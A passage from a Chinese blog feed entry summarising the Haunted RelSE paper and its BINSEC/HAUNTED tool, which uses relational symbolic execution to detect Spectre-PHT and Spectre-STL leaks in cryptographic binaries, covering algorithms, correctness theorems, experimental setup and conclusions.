buffer 中获取一个带有匹配地址的未决的 store，也可以推测性地绕过 store buffer 中未决的 store 并从主存取值；相较于考虑一个 load 表达式与 store buffer 中先前所有的 store 之间的交织部分，研究者选用 <em>read-over-write</em> 来辨识与丢弃大部分的 load 与 先前的 store 自然地 commute 的情况； <em>Read-over-write</em> 为一个著名的对数组理论的简化，其在求解器之前解出了符号化数组的 select 操作</p><p>为了高效地对比下标，read-over-write 依赖于 <em>语法项等价性</em> （syntactic term equality），比较函数 $eq^{井} (i,j)$ 仅在 $i$ 与 $j$ 在语法上相等&#x2F;不等时返回 true&#x2F;false，若项之间无法进行比较，则为未定义，表示为 $⊥$</p><blockquote><p>公式里的这个 <code>#</code> 不懂为啥老是渲染错误，只能用 <code>井</code> 替代一下：( </p></blockquote><p>为了高效地在求解器之前解出 select 操作，read-over-write 定义了一个依赖于以下语法项等价性的 $lookup _{mem}$ 函数：</p><p><img src="https://s2.loli.net/2023/01/28/5t1P2KsjeJirdFz.png" alt="image.png"></p><p>其中 $\widehat{\mu _{n}} \triangleq store(\widehat{\mu} _{n-1} , j, \widehat{\varphi})$</p><p>例如考虑这样的一个内存 $\widehat{\mu}$ ：</p><p><img src="https://s2.loli.net/2023/01/28/s49Iic8LEz5hfO3.png" alt="image.png"></p><ul><li>$lookup _{mem}(\widehat{\mu},ebp - 8)$ 返回 $\widehat{\varphi}$</li><li>$lookup _{mem}(\widehat{\mu},ebp - 4)$ 首先会比较 $ebp - 4$ 与 $ebp - 8$ 并确认他们是 <em>语义不等的</em> （syntactically distinct，即 $\lnot eq^(ebp - 4, eax) &#x3D; \perp$），因此 $select$ 操作并不能被简化</li></ul><p>为了高效地建模 store-to-load forwarding，研究者定义了一个 <code>Algorithm 4</code>  中所示的新函数 $lookup _{SB}$，其返回 store buffer 中一组匹配的 store；此外，$lookup _{SB}$ 每个 load 必须要被失效化的深度，即对于相同地址的一个最近的 store 的失效深度</p><p><img src="https://s2.loli.net/2023/01/28/MKj5Ln9BG1xJ3IH.png" alt="image.png"></p><p>最终研究者定义了 <code>Algorithm 5</code> 中所示函数 $lookup _{ite} (\widehat{\mu},i,\widetilde{\lambda},\delta)$ ，其将 $lookup _{SB}$ 的结果编码为一个符号化的使用新的布尔变量的 if-then-else 表达式；该函数返回 load 表达式的值，并将过程中定义的布尔变量添加到 $\widetilde{\lambda}$ 中；此外，为了实现 $BINSEC&#x2F;HAUNTED$ ，研究者使用布尔变量的名字来编码关于 load 与前面的 store 的位置的信息；因此，我们有可能使用求解器返回的反例来得知触发漏洞是绕过了哪一个 store，这有助于我们了解漏洞并重构攻击图</p><p><img src="https://s2.loli.net/2023/01/28/Bq6ouwNsAkh2Ytz.png" alt="image.png"></p><p>对一个 load 指令的评估如 <code>Algorithm 6</code> 所示，首先该函数会计算下标的符号值并确认其可以被安全地泄露，接下来其会调用 $lookup _{ite}$ 获得 load 指令可以取的符号值的集合，编码为一个单独的 if-then-else 表达式 $\widehat{\iota}$ ，并更新 transient load 的集合 $\widetilde{\lambda}$ ；最后其会使用 load 的值更新寄存器映射并将其失效深度设为 $\delta + \Delta$ ；失效深度会在接下来的对条件分支的评估中使用，以确定该条件是否决定于内存</p><p><img src="https://s2.loli.net/2023/01/28/i2ous4LrlWd8vUg.png" alt="image.png"></p><p><em>3) Invalidate transient loads</em> ：当更多的最近的匹配的 store 都通过设置对应的布尔变量为 false 而失效了，transient load 的值可以被无效化；于 <code>Algorithm 7</code> 中定义的函数 $retireSTL(\pi,\widetilde{\lambda},\delta)$ 从 transient load 的集合 $\widetilde{\lambda}$ 中移除所有的带有在 $\delta$ 下的失效深度的 load，并在路径谓语 $\pi$ 中将相应的布尔变量设为 false；为了可读性，接下来我们引入一个通过同时使用 $retirePHT$ 与 $retireSTL$ 以停止所有推测的函数 $retireALL$ </p><p><img src="https://s2.loli.net/2023/01/28/7Nqnw9sDomUP4Qh.png" alt="image.png"></p><h3 id="C-Theorems"><a href="#C-Theorems" class="headerlink" title="C. Theorems"></a>C. Theorems</h3><p>本节研究者将证明 Haunted RelSE 对于 SCT 的正确性与完备性（达到一个展开边界），这意味着当 Haunted RelSE 报告了一个违规（violation），其为一个真正的 SCT 违规（没有上近似），且当其在深度 k 上报告没有违规时，该程序在深度 k 上是安全的（没有下近似）；为此，研究者证明了 Haunted RelSE 与 Explicit RelSE 是等价的，且展示了 Explicit RelSE 对于达到一个展开边界（up-to-an-unrolling-bound）的 SCT 而言在上是正确且完备的</p><p><strong>Theorem 1.</strong> <em>Explicit RelSE 对于达到一个展开边界的推测常数时间而言在是正确且完备的</em></p><p>$Proof(sketch).$ 该证明为一个简单的对 RelSE 对常数时间的正确性与完备性的证明对推测性语义（speculative semantics）的扩展；该扩展需要展示：</p><ul><li>1）在符号执行中瞬态路径上报告的违规对应到具体瞬态执行中的违规</li><li>2）若在具体瞬态执行中有一个违规，则在符号执行中有一个路径会报告该违规</li></ul><p>接下来研究者将展示 Haunted RelSE 与 Explicit RelSE 等价</p><p><strong>Theorem 2.</strong> （Equivalence Explicit and Haunted RelSE） <em>Haunted RelSE 检测到了一个违规当且仅当 Explicit RelSE 检测到了一个违规</em>  </p><p>在 <code>Appendix B</code> 中研究者给出了一个证明草图，其首先展示了 Spectre-PHT 的理论：在一个条件分支后，Haunted RelSE 探索的两条路径完全地获取了 Explicit RelSE 中探索的四条路径的行为；研究者接下来展示 Spectre-STL 的理论：在一条 load 指令之后，Haunted RelSE 产生的单条路径完全获得了 Explicit RelSE 中多条路径的行为</p><p><strong>Corollary 1.</strong> <em>Haunted RelSE 对于达到一个展开边界的推测常数时间而言在是正确且完备的</em> </p><h3 id="D-BINSEC-x2F-HAUNTED-a-tool-for-Haunted-RelSE"><a href="#D-BINSEC-x2F-HAUNTED-a-tool-for-Haunted-RelSE" class="headerlink" title="D. BINSEC&#x2F;HAUNTED, a tool for Haunted RelSE"></a>D. BINSEC&#x2F;HAUNTED, a tool for Haunted RelSE</h3><p>研究者基于二进制级的分析器 BINSEC 实现了 Haunted RelSE 并称之为 <code>BINSEC/HAUNTED</code> ，其获取一个 x86 可执行文件、秘密输入的位置、一个初始内存配置（通常为完全符号化的）、推测的深度、store buffer 的大小作为输入；BINSEC&#x2F;HAUNTED 以深度优先搜索对程序进行探索，优先处理瞬态路径，并带着反例（即，导致了损坏的初始配置与推测选项）报告 SCT 损坏；其使用当前位向量理论上最好的 SMT 求解器 <code>Boolector</code></p><h1 id="0x05-EXPERIMENTAL-EVALUATION"><a href="#0x05-EXPERIMENTAL-EVALUATION" class="headerlink" title="0x05. EXPERIMENTAL EVALUATION"></a>0x05. EXPERIMENTAL EVALUATION</h1><p>研究者在本论文中回答了这些研究问题：</p><p><strong>RQ 1 Effectiveness.</strong> BINSEC&#x2F;HAUNTED 是否能够在真实世界的密码学二进制文件中发现 Spectre-PHT 与 Spectre-STL 损坏？</p><p><strong>RQ2 Haunted vs Explicit.</strong> Haunted RelSE 与 Explicit RelSE 对比起来如何？</p><p><strong>RQ3 BINSEC&#x2F;HAUNTED vs. SoA tools.</strong> BINSEC&#x2F;Haunted 与最先进的工具比起来如何？</p><p>为了回答 RQ1 与 RQ2，研究者对比了 <em>Explicit</em> 与 <em>Haunted</em> 用以关系符号执行的探索策略的性能——两者都应用于 BINSEC&#x2F;HAUNTED ——在一组真实世界密码学二进制文件与 litmus benchmark（Sections V-B 与 V-C）；为了回答 RQ3，研究者对比了 BINSEC&#x2F;HAUNTED 与最先进的工具 KLEESpectre 与 Pitchfork（Section V-D）</p><p><strong>Legend.</strong> 本节中，$I _{x86}$ 为被探索的不同 x86 指令的数量， $P$ 为探索的路径数量，$T$ 为总的执行时间，<code>一个虫子符号</code> （打不出来）为发现的漏洞数量，⏳为超时数量，✓ 为被证明安全的程序数量，× 为被证明不安全的程序数量</p><h3 id="A-benchmark"><a href="#A-benchmark" class="headerlink" title="A. benchmark"></a>A. benchmark</h3><p>研究者在一台带有 <code>Intel(R) Xeon(R) CPU E3-1505M v6 @ 3.00GHz </code> 处理器与 32GB 内存的机器上进行实验，除了初始栈指针 $esp$ 以外（类似于related work[5]）所有的输入都是符号的，且数据结构为静态分配的；用户需要标记秘密，其余所有的值都是公开的；研究者将推测深度设置为 200 条指令并将 store buffer 的大小设置为 20 条指令，此外，研究者仅考虑顺序执行中的间接跳转目标并实现了一个 <em>影子栈</em> 以限制返回指令在一个合适的返回位置；考虑瞬态跳转目标需要在任意位置建模间接跳转，对于符号执行而言虽然可行但非常棘手</p><p>研究者通过如下程序评估 BINSEC&#x2F;HAUNTED：</p><ul><li><code>litmus-pht</code> ：16 个来自于 Pitchfork 的修改过的 Paul Kocher 的 litmus tests 集合的小的测试用例（litmus tests）用以 Spectre-PHT</li><li><code>litmus-pht-patched</code> ：添加了下标掩码（index masking）的 <code>litmus-pht</code></li><li><code>litmus-stl</code> ：新的一组用以 Spectre-STL 的 litmus tests</li><li>来自 OpenSSL 与 Libsodium 密码学库（详见 Table I） 的密码学原语，包括并扩展至在 <a href="https://doc.libsodium.org/secret-key_cryptography/secretbox">[5]</a> 中被分析的那些</li></ul><p>程序使用 gcc 10.1.0 编译到 32 位 x86 架构上，litmus tests 被以 <code>-fno-stack-protector</code> 选项进行编译，Spectre-STL 的 litmus tests 额外添加了 <code>-no-pie</code> 与 <code>-fno-pic</code> 以排除由这些选项引入的损坏（参见 Section VI）；由于同一原因，<code>donna</code> 与 <code>tea</code> 不带有 <code>-fno-stack-protector</code> 编译选项，优化级别为 <code>O1、O2、O3</code> 与 <code>Ofast</code>；Libsodium 由默认的 Makefile 进行编译，OpenSSL 开启了 <code>O3</code> 优化，两者都开启了 stack protector</p><p><img src="https://s2.loli.net/2023/01/29/4ZgLHYdQ69ibICM.png" alt="image.png"></p><p><em>Note on Stack Protectors</em> ：由 stack protector 引入的解决错误的代码非常复杂且包含了许多无法在纯净的符号执行中分析的系统调用，BINSEC&#x2F;HAUNTED 在系统调用上停止路径执行且每个程序仅跳转到 stack protector 的代码一次，这意味着其可能会错过一些未被探索的代码中的损坏；此外，对于 litmus tests、<code>tea</code>、<code>donna</code>，超时时长被设置为 1 小时，但对于包含 stack protector 的代码则延长至 6 小时（Libsodium 与 OpenSSL）</p><h1 id="0x06-NEW-VULNERABILITIES-AND-MITIGATIONS"><a href="#0x06-NEW-VULNERABILITIES-AND-MITIGATIONS" class="headerlink" title="0x06. NEW VULNERABILITIES AND MITIGATIONS"></a>0x06. NEW VULNERABILITIES AND MITIGATIONS</h1><h1 id="0x07-RELATED-WORK"><a href="#0x07-RELATED-WORK" class="headerlink" title="0x07. RELATED WORK"></a>0x07. RELATED WORK</h1><h1 id="0x08-CONCLUTION"><a href="#0x08-CONCLUTION" class="headerlink" title="0x08. CONCLUTION"></a>0x08. CONCLUTION</h1><p>研究者提出了 Haunted RelSE，一种基于关系符号执行的用以静态检测 Spectre-PHT 与 Spectre-STL 漏洞的技术；特别地，Haunted RelSE 能够通过同时推理常规执行与瞬态执行以显著地减少寻址推测路径的开销；研究者将 Haunted RelSE 应用于一个关系符号执行工具 <code>BINSEC/HAUNTED</code> 中；据研究者的实验结果所示，Haunted RelSE 为迈向可扩展的对 Spectre attacks 的一步；对于 Spectre-PHT，Haunted RelSE 可以在一些情况下极大地提升分析速度，在对中等大小的真实世界中的密码学二进制文件的分析推测语义复杂性进行剪枝；对于 Spectre-STL，BINSEC&#x2F;HAUNTED 是第一个可以彻底分析真实世界中较小的密码学二进制文件并在中等大小的密码学二进制文件中找到漏洞的工具</p><p>最后，研究者通过 BINSEC&#x2F;HAUNTED，报告了一个标准的对 Spectre-PHT 的防护可以轻易地引入 Spectre-STL 漏洞并提出了修复方法，且发现了一个著名的用于编译位置无关可执行文件的 GCC 编译选项会引入 Spectre-STL</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;鬼！&lt;/p&gt;</summary>
    
    
    
    <category term="PAPER" scheme="https://arttnba3.github.io/categories/PAPER/"/>
    
    
    <category term="信息安全" scheme="https://arttnba3.github.io/tags/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/"/>
    
    <category term="符号执行" scheme="https://arttnba3.github.io/tags/%E7%AC%A6%E5%8F%B7%E6%89%A7%E8%A1%8C/"/>
    
    <category term="二进制分析" scheme="https://arttnba3.github.io/tags/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%88%86%E6%9E%90/"/>
    
    <category term="论文笔记" scheme="https://arttnba3.github.io/tags/%E8%AE%BA%E6%96%87%E7%AC%94%E8%AE%B0/"/>
    
    <category term="Spectre" scheme="https://arttnba3.github.io/tags/Spectre/"/>
    
  </entry>
  
</feed>
